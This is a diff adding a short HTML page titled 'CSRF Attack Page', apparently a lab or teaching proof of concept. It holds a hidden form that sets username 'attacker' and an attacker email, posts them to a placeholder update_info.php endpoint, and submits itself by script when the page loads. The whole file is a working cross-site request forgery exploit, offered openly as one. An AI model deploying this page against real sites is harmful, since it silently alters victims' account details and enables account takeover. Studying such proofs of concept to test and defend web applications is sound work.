@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h2>CSRF Attack Page</h2>
+    <form id="csrfForm" action="http://yourserver/update_info.php" method="POST">
+        <input type="hidden" name="username" value="attacker">
+        <input type="hidden" name="email" value="attacker@example.com">
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
